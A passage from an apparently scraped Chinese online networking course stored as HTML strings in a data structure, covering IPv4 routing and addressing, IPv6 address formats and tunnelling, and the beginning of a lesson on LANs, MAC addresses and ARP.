的世界中，网络是一个树状模型。顶层有多个平行的网络，每个网络有自己的网络号。然后顶层网络下方又有多个子网，子网下方还有子网，最后才是设备。</p>\n<p data-nodeid="46681" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/85/CioPOWCKhKqAPvolAABl3y5ucLM593.png" alt="image (3).png" data-nodeid="46688"></p>\n\n<p data-nodeid="44217">IP 协议的寻址过程需要逐级找到网络，最后定位设备。下面我们具体分析下这个过程。</p>\n<p data-nodeid="44218"><strong data-nodeid="44398">步骤 1：找到顶层网络</strong></p>\n<p data-nodeid="44219">比如<code data-backticks="1" data-nodeid="44400">103.16.3.1</code>最顶层的网络号可以和<code data-backticks="1" data-nodeid="44402">255.0.0.0</code>（子网掩码）做位与运算得到，如下所示：</p>\n<pre class="lang-java" data-nodeid="44220"><code data-language="java"><span class="hljs-number">103.16</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span> &amp; <span class="hljs-number">255.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> = <span class="hljs-number">103.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>\n</code></pre>\n<p data-nodeid="44221">因此<code data-backticks="1" data-nodeid="44405">103.0.0.0</code>就是<code data-backticks="1" data-nodeid="44407">103.16.3.1</code>所在的顶层网络。<code data-backticks="1" data-nodeid="44409">255.0.0.0.</code>称作子网掩码。子网掩码的作用就是帮助根据 IP 地址找到对应子网。子网掩码是很多个<code data-backticks="1" data-nodeid="44411">1</code>接着很多个<code data-backticks="1" data-nodeid="44413">0</code>，和 IP 地址一起使用。</p>\n<p data-nodeid="44222"><strong data-nodeid="44418">步骤 2：找到下一层网络</strong></p>\n<p data-nodeid="44223">接下来要找到下一级网络，就需要用 IP 地址和下一级的子网掩码做位与运算。 比如：</p>\n<pre class="lang-java" data-nodeid="44224"><code data-language="java"><span class="hljs-number">103.16</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span> &amp; <span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> = <span class="hljs-number">103.16</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>\n</code></pre>\n<p data-nodeid="44225">其中<code data-backticks="1" data-nodeid="44421">103.16.0.0</code>就是下一级的网络号。</p>\n<p data-nodeid="44226"><strong data-nodeid="44426">步骤 3：找到再下一级网络</strong></p>\n<p data-nodeid="44227">接下来使用<code data-backticks="1" data-nodeid="44428">255.255.255.0</code>子网掩码找到下一级网络是<code data-backticks="1" data-nodeid="44430">103.16.3.0</code>。</p>\n<p data-nodeid="44228"><strong data-nodeid="44435">步骤 4：定位设备</strong></p>\n<p data-nodeid="44229">设备就在子网<code data-backticks="1" data-nodeid="44437">103.16.3.0</code>中，最终找到的设备号是<code data-backticks="1" data-nodeid="44439">1</code>。</p>\n<p data-nodeid="44230">当然子网掩码也不一定都是<code data-backticks="1" data-nodeid="44442">255</code>，比如这个子网掩码<code data-backticks="1" data-nodeid="44444">255.240.0.0</code>也是可以的。但通常我们把 IPv4 的网络分成这样 4 层。</p>\n<h4 data-nodeid="44231">路由（Routing）</h4>\n<p data-nodeid="44232">在寻址过程中，数据总是存于某个局域网中。如果目的地在局域网中，就可以直接定位到设备了。如果目的地不在局域网中，这个时候，就需再去往其他网络。</p>\n<p data-nodeid="44233">由于网络和网络间是网关在连接，因此如果目的地 IP 不在局域网中，就需要为 IP 封包选择通往下一个网络的路径，其实就是选择其中一个网关。你可能会问：网关有多个吗？如果一个网络和多个网络接壤，那自然需要多个网关了。下图中，路由器在选择 IP 封包下一个应该是去往哪个 Gateway？</p>\n<p data-nodeid="47427" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M00/3C/85/CioPOWCKhLKAJ_MVAAB0Y3Ri3XU165.png" alt="image (4).png" data-nodeid="47434"></p>\n\n<p data-nodeid="44235">假如，我们要为 IP 地址 14.215.177.38 寻址，当前路由器所在的网络的编号是16.0.0.0。那么我们就需要知道去往 14.0.0.0 网络的 Gateway IP 地址。</p>\n<p data-nodeid="44236">如果你在当前网络中用<code data-backticks="1" data-nodeid="44454">route</code>查看路由表，可能可以看到一条下面这样的记录。</p>\n<ul data-nodeid="44237">\n<li data-nodeid="44238">\n<p data-nodeid="44239">Destination：14.0.0.0</p>\n</li>\n<li data-nodeid="44240">\n<p data-nodeid="44241">Gateway：16.12.1.100</p>\n</li>\n<li data-nodeid="44242">\n<p data-nodeid="44243">Mask：255.0.0.0</p>\n</li>\n<li data-nodeid="44244">\n<p data-nodeid="44245">Iface：16.12.1.1</p>\n</li>\n</ul>\n<p data-nodeid="44246">这条记录就说明如果你要去往 14.0.0.0 网络，IP 地址 14.215.177.38 先要和 255.0.0.0 进行位运算，然后再查表，看到 14.0.0.0，得知去往 Gateway 的网卡（IFace）是 16.12.1.1。</p>\n<p data-nodeid="44247">当封包去向下一个节点后，会进入新的路由节点，然后会继续上述路由过程，直到最终定位到设备。</p>\n<h3 data-nodeid="44248">总结</h3>\n<p data-nodeid="44249">这一讲我们学习了 IP 协议和 IP 协议的工作原理。首先 IP 协议会进行分片，将上游数据拆成一个个的封包（Datagram），然后为封包增加 IP 头部。封包发送出去后，就开始了寻址过程。寻址就是找到 IP 地址对应的设备。在局域网内，如果找不到设备，就需要路由。路由就是找到数据应该往哪里发送。最后通过层层路由定位到具体的设备。</p>\n<p data-nodeid="44250"><strong data-nodeid="44468">那么现在你可以尝试来回答本讲关联的面试题目：路由和寻址的区别是什么</strong>？</p>\n<p data-nodeid="44251">【<strong data-nodeid="44474">解析</strong>】寻址（Addressing）就是通过地址找设备。和现实生活中的寻址是一样的，比如根据地址找到一个公寓。在 IPv4 协议中，寻址找到的是一个设备所在的位置。</p>\n<p data-nodeid="44252">路由（Routing）本质是路径的选择。就好像知道地址，但是到了每个十字路口，还需要选择具体的路径。</p>\n<p data-nodeid="44253">所以，要做路由，就必须能够理解地址，也就是需要借助寻址的能力。要通过寻址找到最终的设备，又要借助路由在每个节点选择数据传输的线路。因此，路由和寻址，是相辅相成的关系。</p>\n<h3 data-nodeid="44254">思考题</h3>\n<p data-nodeid="44255"><strong data-nodeid="44482">最后再出一道需要你查资料的思考题：下面这几个地址 127.0.0.1, localhost, 0.0.0.0 有什么不同</strong>？</p>\n<p data-nodeid="44256">我建议你拿出几分钟的时间，把答案写在留言区。这个输出的过程不仅能够帮助你产生更多的思考，也是构建知识体系的根基。如果你对本次课程有什么建议和疑问，可以在评论区留言讨论。如果你有所收获，也可以推荐给你的朋友。</p>\n<p data-nodeid="44257" class="">这一讲就到这里。发现求知的乐趣，我是林䭽，感谢你学习本次课程。下一讲我们将学习“07 | IPv6 协议：Tunnel 技术是什么”。再见！</p>',
        article_title: "06 | IPv4 协议：路由和寻址的区别是什么？",
        title: "06 | IPv4 协议：路由和寻址的区别是什么？",
        id: 7271,
      },
      {
        content:
          '<p data-nodeid="175776">IPv4 用 32 位整数描述地址，最多只能支持 43 亿设备，显然是不够用的，这也被称作 IP 地址耗尽问题。</p>\n<p data-nodeid="175777">为了解决这个问题，有一种可行的方法是<strong data-nodeid="175895">拆分子网</strong>。拆分子网，会带来很多问题，比如说内外网数据交互，需要网络地址转换协议（NAT 协议），增加传输成本。再比如说，多级网络会增加数据的路由和传输链路，降低网络的速度。理想的状态当然是所有设备在一个网络中，互相可以通过地址访问。</p>\n<p data-nodeid="175778">为了解决这个问题，1998 年互联网工程工作小组推出了全新款的 IP 协议——IPv6 协议。但是目前 IPv6 的普及程度还不够高，2019 年据中国互联网络信息中心（CNNIC）统计，IPv6 协议目前在我国普及率为 60%，已经位居世界首位。</p>\n<p data-nodeid="176769" class="">既然不能做到完全普及，也就引出了<strong data-nodeid="176775">本讲关联的一道面试题目：什么是 Tunnel 技术</strong>？下面请你带着这个问题，开启今天的学习吧！</p>\n\n<h3 data-nodeid="175780">IPv4 和 IPv6 相似点</h3>\n<p data-nodeid="175781">IPv6 的工作原理和 IPv4 类似，分成切片（Segmentation）、增加封包头、路由（寻址）这样几个阶段去工作。IPv6 同样接收上方主机到主机（Host-to-Host）协议传递来的数据，比如一个 TCP  段（Segment），然后将 TCP 段再次切片做成一个个的 IPv6 封包（Datagram or Packet），再调用底层局域网能力（数据链路层）传输数据。具体的过程如下图所示：</p>\n<p data-nodeid="177438" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/0B/CioPOWCH4u-AWVEAAAH_xR5D6lU716.png" alt="Drawing 1.png" data-nodeid="177441"></p>\n\n\n<p data-nodeid="175784"><strong data-nodeid="175915">作为网络层协议的 IPv6，最核心的能力是确保数据可以从发送主机到达接收主机</strong>。因此，和 IPv4 类似，IPv6同样需要定义地址的格式，以及路由算法如何工作。</p>\n<h3 data-nodeid="175785">IPv6 地址</h3>\n<p data-nodeid="175786">接下来我们重点说说地址格式的区别。</p>\n<p data-nodeid="175787">IPv4 的地址是 4 个 8 位（octet），总共 32 位。 IPv6 的地址是 8 个 16 位（hextet），总共 128 位。从这个设计来看，IPv6 可以支持的地址数量是 IPv4 的很多倍。就算将 IPv6 的地址分给每个人，每个人拥有的地址数量，依旧是今天总地址数量的很多倍。</p>\n<p data-nodeid="175788">格式上，IPv4 的地址用<code data-backticks="1" data-nodeid="175920">.</code>分割，如<code data-backticks="1" data-nodeid="175922">103.28.7.35</code>。每一个是 8 位，用 0-255 的数字表示。</p>\n<p data-nodeid="175789">IPv6 的地址用<code data-backticks="1" data-nodeid="175925">:</code>分割，如<code data-backticks="1" data-nodeid="175927">0123:4567:89ab:cdef:0123:4567:89ab:cdef</code>，总共 8 个 16 位的数字，通常用 16 进制表示。</p>\n<p data-nodeid="175790">#图片需要重绘，并参考下方中英翻译，在图中标出对应中文</p>\n<ul data-nodeid="175791">\n<li data-nodeid="175792">\n<p data-nodeid="175793">Hexadecimal notation：十六进制表示</p>\n</li>\n<li data-nodeid="175794">\n<p data-nodeid="175795">Quartet：16 位</p>\n</li>\n<li data-nodeid="175796">\n<p data-nodeid="175797">Most significant：最高有效位</p>\n</li>\n<li data-nodeid="175798">\n<p data-nodeid="175799">Binary notation：二进制表示</p>\n</li>\n</ul>\n<p data-nodeid="178096" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/0B/CioPOWCH4wGAT3bUAALH_YQ0Q-U502.png" alt="Drawing 3.png" data-nodeid="178099"></p>\n\n\n<p data-nodeid="175802">上图中的地址是一个 IPv6 地址的完全态，其实也有简写的方式。比如:</p>\n<pre class="lang-java" data-nodeid="175803"><code data-language="java"><span class="hljs-number">0123</span>:<span class="hljs-number">4567</span>:<span class="hljs-number">0000</span>:<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span>:<span class="hljs-number">4567</span>:<span class="hljs-number">0000</span>:cdef\n</code></pre>\n<p data-nodeid="175804">可以省略前 64 字节的<code data-backticks="1" data-nodeid="175942">0000:0000</code>简写为：</p>\n<pre class="lang-java" data-nodeid="175805"><code data-language="java"><span class="hljs-number">0123</span>:<span class="hljs-number">4567</span>::<span class="hljs-number">0123</span>:<span class="hljs-number">4567</span>:<span class="hljs-number">0000</span>:cdef\n</code></pre>\n<p data-nodeid="175806"><code data-backticks="1" data-nodeid="175944">::</code>只能出现一次，相当于省略了若干组<code data-backticks="1" data-nodeid="175946">0000</code>。比如说<code data-backticks="1" data-nodeid="175948">1111::2222</code>相当于中间省略了 6 组<code data-backticks="1" data-nodeid="175950">0000</code>。为什么不能出现两个<code data-backticks="1" data-nodeid="175952">::</code>呢？因为如果有两个<code data-backticks="1" data-nodeid="175954">::</code>，就会对省略的<code data-backticks="1" data-nodeid="175956">0000</code>的位置产生歧义。比如说<code data-backticks="1" data-nodeid="175958">1111::2222:3333</code>，你就不知道究竟<code data-backticks="1" data-nodeid="175960">0000</code>在<code data-backticks="1" data-nodeid="175962">1111::2222</code>和<code data-backticks="1" data-nodeid="175964">2222::3333</code>是怎么分布的。</p>\n<p data-nodeid="175807">开头的 0 也可以简写，就变成如下的样子：</p>\n<pre class="lang-java" data-nodeid="175808"><code data-language="java"><span class="hljs-number">123</span>:<span class="hljs-number">4567</span>::<span class="hljs-number">123</span>:<span class="hljs-number">4567</span>:<span class="hljs-number">0</span>:cdef\n</code></pre>\n<p data-nodeid="175809">还有一种情况我们想要后面部分都填<code data-backticks="1" data-nodeid="175968">0</code>，比如说<code data-backticks="1" data-nodeid="175970">3c4d::/16</code>，这个代表只有前<code data-backticks="1" data-nodeid="175972">16</code>位有数据，后面是<code data-backticks="1" data-nodeid="175974">0</code>；<code data-backticks="1" data-nodeid="175976">1234:5878:abcd/64</code>代表只有左边<code data-backticks="1" data-nodeid="175978">64</code>位有数据，后面是 0；再比如<code data-backticks="1" data-nodeid="175980">ff00/8</code>，只有左边 8 位是有数据的。</p>\n<h3 data-nodeid="175810">IPv6 的寻址</h3>\n<p data-nodeid="175811">接下来我们讨论下寻址，和 IPv4 相同，寻址的目的是找到设备，以及规划到设备途经的路径。和 IPv4 相同，IPv6寻址最核心的内容就是要对网络进行划分。IPv6 地址很充裕，因此对网络的划分和 IPv4 有很显著的差异。</p>\n<p data-nodeid="175812">IPv6 的寻址分成了几种类型：</p>\n<ul data-nodeid="175813">\n<li data-nodeid="175814">\n<p data-nodeid="175815">全局单播寻址（和 IPv4 地址作用差不多，在互联网中通过地址查找一个设备，简单来说，单播就是 1  对  1）；</p>\n</li>\n<li data-nodeid="175816">\n<p data-nodeid="175817">本地单播（类似 IPv4 里的一个内部网络，要求地址必须以<code data-backticks="1" data-nodeid="175987">fe80</code>开头，类似我们 IPv4 中<code data-backticks="1" data-nodeid="175989">127</code>开头的地址）；</p>\n</li>\n<li data-nodeid="175818">\n<p data-nodeid="175819">分组多播（Group Multicast），类似今天我们说的广播，将消息发送给多个接收者；</p>\n</li>\n<li data-nodeid="175820">\n<p data-nodeid="175821">任意播（Anycast），这个方式比较特殊，接下来我们会详细讲解。</p>\n</li>\n</ul>\n<h4 data-nodeid="180687" class="">全局单播</h4>\n\n\n\n\n<p data-nodeid="181329" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/03/Cgp9HWCH4w-AEinAAAHIfeF4_II848.png" alt="Drawing 5.png" data-nodeid="181332"></p>\n\n\n\n<p data-nodeid="175826">全局单播，就是将消息从一个设备传到另一个设备，这和 IPv4 发送/接收消息大同小异。而全局单播地址，目标就是定位网络中的设备，这个地址和 IPv4 的地址作用相同，只不过格式略有差异。<strong data-nodeid="176009">总的来说，IPv6 地址太多，因此不再需要子网掩码，而是直接将 IPv6 的地址分区即可</strong>。</p>\n<p data-nodeid="175827">在实现全局单播时，IPv6 地址通常分成 3 个部分：</p>\n<ul data-nodeid="175828">\n<li data-nodeid="175829">\n<p data-nodeid="175830">站点前缀（Site Prefix）48bit，一般是由 ISP（Internet Service Providor，运营商）或者RIR（Regional Internet Registry， 地区性互联网注册机构），RIR 将 IP 地址分配给运营商；</p>\n</li>\n<li data-nodeid="175831">\n<p data-nodeid="175832">子网号（Subnet ID），16bit，用于站点内部区分子网；</p>\n</li>\n<li data-nodeid="175833">\n<p data-nodeid="175834">接口号（Interface ID）， 64bit，用于站点内部区分设备。</p>\n</li>\n</ul>\n<p data-nodeid="175835">因此 IPv6 也是一个树状结构，站点前缀需要一定资质，子网号和接口号内部定义。IPv6 的寻址过程就是先通过站点前缀找到站点，然后追踪子网，再找到接口（也就是设备的网卡）。</p>\n<p data-nodeid="175836">从上面全局单播的分区，我们可以看出，IPv6 分给站点的地址非常多。一个站点，有 16bit 的子网，相当于 65535 个子网；每个子网中，还可以用 64 位整数表示设备。</p>\n<h4 data-nodeid="183848" class="">本地单播</h4>\n\n\n\n\n<p data-nodeid="175838">理论上，虽然 IPv6 可以将所有的设备都连入一个网络。但在实际场景中，很多公司还是需要一个内部网络的。这种情况在 IPv6 的设计中属于局域网络。</p>\n<p data-nodeid="175839">在局域网络中，实现设备到设备的通信，就是本地单播。IPv6 的本地单播地址组成如下图所示：</p>\n<p data-nodeid="184472" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/03/Cgp9HWCH4x6AJJxNAAEMhuOKNmY768.png" alt="Drawing 7.png" data-nodeid="184475"></p>\n\n\n<p data-nodeid="175842">这种协议比较简单，本地单播地址必须以<code data-backticks="1" data-nodeid="176029">fe80</code>开头，后面 64 位的 0，然后接上 54 位的设备编号。上图中的 Interface 可以理解成网络接口，其实就是网卡。</p>\n<h4 data-nodeid="186935" class="">分组多播</h4>\n\n\n\n\n<p data-nodeid="175844">有时候，我们需要实现广播。所谓广播，就是将消息同时发送给多个接收者。</p>\n<p data-nodeid="175845">IPv6 中设计了分组多播，来实现广播的能力。当 IP 地址以 8 个 1 开头，也就是<code data-backticks="1" data-nodeid="176037">ff00</code>开头，后面会跟上一个分组的编号时，就是在进行分组多播。</p>\n<p data-nodeid="175846">这个时候，我们需要一个广播设备，在这个设备中已经定义了这些分组编号，并且拥有分组下所有设备的清单，这个广播设备会帮助我们将消息发送给对应分组下的所有设备。</p>\n<h4 data-nodeid="189372" class="">任意播（Anycast）</h4>\n\n\n\n\n<p data-nodeid="175848">任意播，本质是将消息发送给多个接收方，并选择一条最优的路径。这样说有点抽象，接下来我具体解释一下。</p>\n<p data-nodeid="175849">比如说在一个网络中有多个授时服务，这些授时服务都共享了一个任播地址。当一个客户端想要获取时间，就可以将请求发送到这个任播地址。客户端的请求扩散出去后，可能会找到授时服务中的一个或者多个，但是距离最近的往往会先被发现。这个时候，客户端就使用它第一次收到的授时信息修正自己的时间。</p>\n<h3 data-nodeid="189976">IPv6 和 IPv4 的兼容</h3>\n\n\n<p data-nodeid="175852">目前 IPv6 还没有完全普及，大部分知名的网站都是同时支持 IPv6 和  IPv4。这个时候我们可以分成 2 种情况讨论：</p>\n<ol data-nodeid="175853">\n<li data-nodeid="175854">\n<p data-nodeid="175855">一个 IPv4 的网络和一个 IPv6 的网络通信；</p>\n</li>\n<li data-nodeid="175856">\n<p data-nodeid="175857">一个 IPv6 的网络和一个 IPv6 的网络通信，但是中间需要经过一个 IPv4 的网络。</p>\n</li>\n</ol>\n<p data-nodeid="175858">下面我们具体分析一下。</p>\n<p data-nodeid="175859"><strong data-nodeid="176054">情况 1：IPv4 网络和 IPv6 网络通信</strong></p>\n<p data-nodeid="175860">例如一个 IPv6 的客户端，想要访问 IPv4 的服务器，步骤如下图所示：</p>\n<p data-nodeid="190578" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/0C/CioPOWCH4y-AUMRWAAMbF03aDqY454.png" alt="Drawing 9.png" data-nodeid="190581"></p>\n\n\n<ol data-nodeid="175863">\n<li data-nodeid="175864">\n<p data-nodeid="175865">客户端通过 DNS64 服务器查询 AAAA 记录。DNS64 是国际互联网工程任务组（IETF）提供的一种解决 IPv4 和 IPv6 兼容问题的 DNS 服务。这个 DNS 查询服务会把 IPv4 地址和 IPv6 地址同时返回。</p>\n</li>\n<li data-nodeid="175866">\n<p data-nodeid="175867">DNS64 服务器返回含 IPv4 地址的 AAAA 记录。</p>\n</li>\n<li data-nodeid="175868">\n<p data-nodeid="175869">客户端将对应的 IPv4 地址请求发送给一个 NAT64 路由器</p>\n</li>\n<li data-nodeid="175870">\n<p data-nodeid="175871">由这个 NAT64 路由器将 IPv6 地址转换为 IPv4 地址，从而访问 IPv4 网络，并收集结果。</p>\n</li>\n<li data-nodeid="175872">\n<p data-nodeid="175873">消息返回到客户端。</p>\n</li>\n</ol>\n<p data-nodeid="175874"><strong data-nodeid="176070">情况 2：两个 IPv6 网络被 IPv4 隔离</strong></p>\n<p data-nodeid="175875">这种情况在普及 IPv6 的过程中比较常见，IPv6 的网络一开始是一个个孤岛，IPv6 网络需要通信，就需要一些特别的手段。</p>\n<p data-nodeid="175876">不知道你有没有联想到坐火车穿越隧道的感觉，连接两个孤岛 IPv6 网络，其实就是在 IPv4 网络中建立一条隧道。如下图所示：</p>\n<p data-nodeid="191174" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M00/3C/03/Cgp9HWCH4ziAD-hYAAMdJ6IgvWE780.png" alt="Drawing 11.png" data-nodeid="191177"></p>\n\n\n<p data-nodeid="175879"><strong data-nodeid="176083">隧道的本质就是在两个 IPv6 的网络出口网关处，实现一段地址转换的程序</strong>。</p>\n<h3 data-nodeid="175880">总结</h3>\n<p data-nodeid="175881">总结下，<strong data-nodeid="176090">IPv6 解决的是地址耗尽的问题</strong>。因为解决了地址耗尽的问题，所以很多其他问题也得到了解决，比如说减少了子网，更小的封包头部体积，最终提升了性能等。</p>\n<p data-nodeid="175882">除了本讲介绍的内容，下一讲你还会从局域网络中看到更多对 NAT 技术的解读、对路由器的作用的探讨。随着 IPv6 彻底普及，你可以想象一下，运营商可以给到每个家庭一大批固定的 IP 地址，发布网页似乎可以利用家庭服务器……总之，林䭽也不知道最终会发生什么，我也对未来充满了期待，让我们拭目以待吧。</p>\n<p data-nodeid="175883">那么，通过这一讲的学习，你可以尝试回答本讲关联的面试题目：Tunnel 技术是什么了吗？</p>\n<p data-nodeid="175884">【<strong data-nodeid="176098">解析</strong>】Tunnel 就是隧道，这和现实中的隧道是很相似的。隧道不是只有一辆车通过，而是每天都有大量的车辆来来往往。两个网络，用隧道连接，位于两个网络中的设备通信，都可以使用这个隧道。隧道是两个网络间用程序定义的一种通道。具体来说，如果两个 IPv6 网络被 IPv4 分隔开，那么两个 IPv6 网络的出口处（和 IPv4 网络的网关处）就可以用程序（或硬件）实现一个隧道，方便两个网络中设备的通信。</p>\n<h3 data-nodeid="175885">思考题</h3>\n<p data-nodeid="175886"><strong data-nodeid="176104">最后，我再给你出一道需要查资料的思考题：请你总结下 IPv6 和 IPv4 究竟有哪些区别</strong>？</p>\n<p data-nodeid="175887">我建议你拿出几分钟的时间，把这两者的区别写在留言区。这个输出的过程不仅能够帮助你产生更多的思考，也是构建知识体系的根基。如果你对本次课程有什么建议和疑问，可以在评论区留言。如果你有所收获，也可以推荐给你的朋友。</p>\n<p data-nodeid="175888">这一讲就到这里。发现求知的乐趣，我是林䭽，感谢你学习本次课程。下一讲我们将学习“08 | 局域网：NAT 是如何工作的？”再见！</p>',
        article_title: "07 | IPv6 协议：Tunnel 技术是什么？",
        title: "07 | IPv6 协议：Tunnel 技术是什么？",
        id: 7272,
      },
      {
        content:
          '<p data-nodeid="1121" class="">广域网是由很多的局域网组成的，比如公司网络、家庭网络、校园网络等。之前我们一直在讨论广域网的设计，今天我们到微观层面，看看局域网是如何工作的。</p>\n<p data-nodeid="1122">IPv4 的地址不够，因此需要设计子网。当一个公司申请得到一个公网 IP 后，会在自己的公司内部设计一个局域网。这个局域网所有设备的 IP 地址，通常会以 192.168 开头。这个时候，假设你的职工小明，上班时间玩王者荣耀。当他用 UDP 协议向王者荣耀的服务器发送信息时，消息的源 IP 地址是一个内网 IP 地址，而王者荣耀的服务，是一个外网 IP 地址。</p>\n<p data-nodeid="1123"><strong data-nodeid="1205">这里我先向你提一个问题，数据到王者荣耀服务器可以通过寻址和路由找到目的地，但是数据从王者荣耀服务器回来的时候，王者荣耀服务器如何知道</strong><code data-backticks="1" data-nodeid="1203">192.168</code>开头的地址应该如何寻址呢？</p>\n<p data-nodeid="1124">要想回答这个问题，就涉及网络地址转换协议（NAT 协议）。下面请你带着这个问题，开启今天的学习吧。</p>\n<h3 data-nodeid="1125">内部网络和外部网络</h3>\n<p data-nodeid="1126">对一个组织、机构、家庭来说，我们通常把内部网络称为局域网，外部网络就叫作外网。下图是一个公司多个部门的网络架构。</p>\n<p data-nodeid="1400" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/39/Cgp9HWCJIMaACsQqAAKt__fEo9U561.png" alt="图片11.png" data-nodeid="1403"></p>\n\n<p data-nodeid="1128">我们会看到外网通过路由器接入整个公司的局域网，和路由器关联的是三台交换机，代表公司的三个部门。<strong data-nodeid="1217">交换机，或者称为链路层交换机，通常工作在链路层；而路由器通常也具有交换机的能力，工作在网络层和链路层</strong>。关于它们的详细区别，我们会在本文的后续讨论。</p>\n<p data-nodeid="1129">光纤是一种透明的导光介质，多束光可以在一个介质中并行传播，不仅信号容量大，重量轻，并行度高而且传播距离远。当然，光纤不能弯曲，因此办公室里用来连接交换机和个人电脑的线路肯定不能是光纤，<strong data-nodeid="1223">光线通常都用于主干网络</strong>。</p>\n<h3 data-nodeid="1130">局域网数据交换（MAC 地址）</h3>\n<p data-nodeid="1131">接下来我们讨论下同一个局域网中的设备如何交换消息。</p>\n<p data-nodeid="1132">首先，我们先明确一个概念，设备间通信的本质其实是设备拥有的网络接口（网卡）间的通信。<strong data-nodeid="1231">为了区别每个网络接口，互联网工程任务组（IETF）要求每个设备拥有一个唯一的编号，这个就是 MAC 地址</strong>。</p>\n<p data-nodeid="1133"><strong data-nodeid="1236">你可能会问：IP 地址不也是唯一的吗</strong>？其实不然，一旦设备更换位置，比如你把你的电脑从北京邮寄的广州，那么 IP 地址就变了，而电脑网卡的 MAC 地址不会发生变化。总的来说，IP 地址更像现实生活中的地址，而 MAC 地址更像你的身份证号。</p>\n<p data-nodeid="1134">然后，我们再明确另一个基本的概念。<strong data-nodeid="1242">在一个局域网中，我们不可以将消息从一个接口（网卡）发送到另一个接口（网卡），而是要通过交换机</strong>。为什么是这样呢？因为两个网卡间没有线啊！所以数据交换，必须经过交换机，毕竟线路都是由网卡连接交换机的。</p>\n<p data-nodeid="1962" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/42/CioPOWCJINCAWTthAACzGJa966I160.png" alt="图片2.png" data-nodeid="1965"></p>\n\n<p data-nodeid="1136">总结下，数据的发送方，将自己的 MAC 地址、目的地 MAC 地址，以及数据作为一个分组（Packet），也称作 Frame 或者封包，发送给交换机。交换机再根据目的地 MAC 地址，将数据转发到目的地的网络接口（网卡）。</p>\n<p data-nodeid="1137"><strong data-nodeid="1255">最后一个问题，你可能问，这个分组或者 Frame，是不是 IP 协议的分组呢</strong>？——不是，这里提到的是链路层的数据交换，它支持 IP 协议工作，是网络层的底层。所以，<strong data-nodeid="1256">如果 IP 协议要传输数据，就要将数据转换成为链路层的分组，然后才可以在链路层传输</strong>。</p>\n<p data-nodeid="1138">链路层分组大小受限于链路层的网络设备、线路以及使用了链路层协议的设计。你有时候可能会看到 MTU 这个缩写词，它指的是 Maximun Transmission Unit，最大传输单元，意思是链路层网络允许的最大传输数据分组的大小。<strong data-nodeid="1262">因此 IP 协议要根据 MTU 拆分封包</strong>。</p>\n<p data-nodeid="1139">之前在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7268&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1268">04 | TCP 的稳定性：滑动窗口和流速控制是怎么回事？</a>”介绍 TCP 协议滑动窗口的时候，还提到过一个词，叫作 MSS，这里我们复习下。MSS（Maximun Segment Size，最大段大小）是 TCP 段，或者称为 TCP 分组（TCP Packet）的最大大小。<strong data-nodeid="1274">MSS 是传输层概念，MTU 是链路层概念</strong>。</p>\n<p data-nodeid="1140">聪明的同学可以能会意识到，这不就是下面这样一个数学关系吗？</p>\n<pre class="lang-java" data-nodeid="1141"><code data-language="java">MTU = MSS + TCP Header + IP Header\n</code></pre>\n<p data-nodeid="1142"><strong data-nodeid="1284">这个思路有一定道理，但是不对</strong>。先说说这个思路怎么来的，你可能会这么思考：TCP 传输数据大于 MSS，就拆包。每个封包加上 TCP Header ，之后经过 IP 协议，再加上 IP Header。于是这个加上 IP 头的分组（Packet）不能超过 MTU。固然这个思路很有道理，可惜是错的。<strong data-nodeid="1285">因为 TCP 解决的是广域网的问题，MTU 是一个链路层的概念，要知道不同网络 MTU 是不同的，所以二者不可能产生关联。这也是为什么 IP 协议还可能会再拆包的原因</strong>。</p>\n<h3 data-nodeid="1143">地址解析协议（ARP）</h3>\n<p data-nodeid="1144">上面我们讨论了 MAC 地址，链路层通过 MAC 地址定位网络接口（网卡）。在一个网络接口向另一个网络接口发送数据的时候，至少要提供这样 3 个字段：</p>\n<ol data-nodeid="1145">\n<li data-nodeid="1146">\n<p data-nodeid="1147">源 MAC 地址</p>\n</li>\n<li data-nodeid="1148">\n<p data-nodeid="1149">目标 MAC 地址</p>\n</li>\n<li data-nodeid="1150">\n<p data-nodeid="1151">数据</p>\n</li>\n</ol>\n<p data-nodeid="1152"><strong data-nodeid="1295">这里我们一起再来思考一个问题，对于一个网络接口，它如何能知道目标接口的 MAC 地址呢</strong>？我们在使用传输层协议的时候，清楚地知道目的地的 IP 地址，但是我们不知道 MAC 地址。这个时候，就需要一个中间服务帮助根据 IP 地址找到 MAC 地址——这就是地址解析协议（Address Resolution Protocol，ARP）。</p>\n<p data-nodeid="1153">整个工作过程和 DNS 非常类似，如果一个网络接口已经知道目标 IP 地址对应的 MAC 地址了，它会将数据直接发送给交换机，交换机将数据转发给目的地，这个过程如下图所示：</p>\n<p data-nodeid="2524" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/39/Cgp9HWCJIN6ALcIOAAGvaaKiqtM412.png" alt="图片3.png" data-nodeid="2528"></p>\n<div data-nodeid="2525"><p style="text-align:center">已知目的地 MAC 可以直接发送</p></div>\n\n\n<p data-nodeid="1156">那么如果网络接口不知道目的地地址呢？这个时候，地址解析协议就开始工作了。发送接口会发送一个广播查询给到交换机，交换机将查询转发给所有接口。</p>\n<p data-nodeid="3087" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/42/CioPOWCJIOaAWL2vAAIjZo8-JVY343.png" alt="图片4.png" data-nodeid="3090"></p>\n\n<p data-nodeid="1158">如果某个接口发现自己就是对方要查询的接口，则会将自己的 MAC 地址回传。接下来，会在交换机和发送接口的 ARP 表中，增加一个缓存条目。也就是说，接下来发送接口再次向 IP 地址 2.2.2.2 发送数据时，不需要再广播一次查询了。</p>\n<p 